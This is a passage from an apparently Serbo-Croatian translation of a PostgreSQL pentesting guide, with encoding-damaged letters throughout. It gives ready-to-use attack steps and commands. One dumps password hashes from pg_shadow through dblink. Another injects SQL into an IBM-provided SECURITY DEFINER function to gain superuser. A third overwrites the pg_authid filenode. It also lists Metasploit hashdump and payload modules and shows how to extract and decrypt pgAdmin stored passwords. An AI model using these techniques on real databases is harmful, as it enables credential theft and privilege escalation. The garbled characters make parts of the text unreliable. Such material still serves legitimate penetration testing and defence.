Zatim ƒáe tabela `shell_commands_results` sadr≈æati izlaz izvr≈°enog koda:

```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```

### Lokalni Login

Neke pogre≈°no konfigurisane postgresql instance mogu dozvoliti prijavljivanje bilo kog lokalnog korisnika, moguƒáe je lokalno sa 127.0.0.1 koristeƒái **`dblink` funkciju**:

```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```

{% hint style="warning" %}
Imajte na umu da bi prethodni upit radio, **funkcija `dblink` mora postojati**. Ako ne postoji, mo≈æete poku≈°ati da je kreirate pomoƒáu

```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Ako imate lozinku korisnika sa vi≈°e privilegija, ali korisniku nije dozvoljeno da se prijavi sa spoljne IP adrese, mo≈æete koristiti sledeƒáu funkciju da izvr≈°ite upite kao taj korisnik:

```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```

Moguƒáe je proveriti da li ova funkcija postoji sa:

```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```

### **Prilagoƒëena definisana funkcija sa** SECURITY DEFINER

[U ovom obja≈°njenju](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesteri su uspeli da postanu superkorisnici unutar postgres instanci koje je obezbedio IBM, jer su **prona≈°li ovu funkciju sa SECURITY DEFINER oznakom**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Kako je [**obja≈°njeno u dokumentaciji**](https://www.postgresql.org/docs/current/sql-createfunction.html), funkcija sa **SECURITY DEFINER** se izvr≈°ava sa privilegijama **korisnika koji je vlasnik**. Stoga, ako je funkcija **ranjiva na SQL Injection** ili vr≈°i **privilegovane akcije sa parametrima koje kontroli≈°e napadaƒç**, mo≈æe biti zloupotrebljena za **poveƒáanje privilegija unutar postgres-a**.

Na liniji 4 prethodnog koda mo≈æete videti da funkcija ima oznaku **SECURITY DEFINER**.

```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```

I zatim **izvr≈°ite komande**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Proƒëite BruteForce sa PL/pgSQL

**PL/pgSQL** je **potpuno opremljeni programski jezik** koji nudi veƒáu proceduralnu kontrolu u poreƒëenju sa SQL-om. Omoguƒáava kori≈°ƒáenje **petlji** i drugih **kontrolnih struktura** radi pobolj≈°anja logike programa. Pored toga, **SQL naredbe** i **okidaƒçi** imaju moguƒánost da pozovu funkcije koje su kreirane kori≈°ƒáenjem **PL/pgSQL jezika**. Ova integracija omoguƒáava sveobuhvatan i fleksibilan pristup programiranju baze podataka i automatizaciji.\
**Mo≈æete zloupotrebiti ovaj jezik kako biste zatra≈æili od PostgreSQL-a da brute-force-uje korisniƒçke podatke.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Poveƒáanje privilegija pisanjem preko internih PostgreSQL tabela

{% hint style="info" %}
Sledeƒái vektor poveƒáanja privilegija je posebno koristan u kontekstima ograniƒçenih SQLi, jer se svi koraci mogu izvr≈°iti kroz ugnje≈ædene SELECT naredbe
{% endhint %}

Ako mo≈æete **ƒçitati i pisati fajlove servera PostgreSQL-a**, mo≈æete **postati superkorisnik** pisanjem preko PostgreSQL on-disk filenode-a, koji je povezan sa internom tabelom `pg_authid`.

Proƒçitajte vi≈°e o **ovoj tehnici** [**ovde**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Koraci napada su:

1. Dobijanje PostgreSQL direktorijuma sa podacima
2. Dobijanje relativne putanje do filenode-a, povezanog sa tabelom `pg_authid`
3. Preuzimanje filenode-a kroz funkcije `lo_*`
4. Dobijanje tipa podataka, povezanog sa tabelom `pg_authid`
5. Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) da [uredite filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); postavite sve `rol*` boolean zastave na 1 za puna ovla≈°ƒáenja.
6. Ponovo otpremite ureƒëeni filenode putem funkcija `lo_*`, i prepi≈°ite originalni fajl na disku
7. _(Opciono)_ Obri≈°ite ke≈°iranu tabelu iz memorije pokretanjem skupog SQL upita
8. Sada biste trebali imati privilegije potpunog superadmina.

## **POST**

```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```

### bele≈æenje

Unutar fajla _**postgresql.conf**_ mo≈æete omoguƒáiti postgresql zapise menjajuƒái:

```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```

Zatim, **ponovo pokrenite servis**.

### pgadmin

[pgadmin](https://www.pgadmin.org) je platforma za administraciju i razvoj PostgreSQL baze podataka.\
Mo≈æete pronaƒái **≈°ifre** unutar _**pgadmin4.db**_ fajla.\
Mo≈æete ih de≈°ifrovati koristeƒái _**decrypt**_ funkciju unutar skripte: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)

```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```

### pg\_hba

Klijentska autentikacija u PostgreSQL-u se upravlja kroz konfiguracioni fajl nazvan **pg\_hba.conf**. Ovaj fajl sadr≈æi niz zapisa, pri ƒçemu svaki specificira tip konekcije, opseg IP adresa klijenta (ako je primenljivo), ime baze podataka, korisniƒçko ime i metod autentikacije koji se koristi za povezivanje. Prvi zapis koji se poklapa sa tipom konekcije, adresom klijenta, tra≈æenom bazom podataka i korisniƒçkim imenom se koristi za autentikaciju. Ne postoji rezervna opcija ako autentikacija ne uspe. Ako nijedan zapis ne odgovara, pristup je odbijen.

Dostupni metodi autentikacije zasnovani na lozinkama u pg\_hba.conf su **md5**, **crypt** i **password**. Ovi metodi se razlikuju u naƒçinu prenosa lozinke: MD5 he≈°iranje, kriptovano ≈°ifrovanje ili ƒçisti tekst. Va≈æno je napomenuti da metoda crypt ne mo≈æe biti kori≈°ƒáena sa lozinkama koje su enkriptovane u pg\_authid.
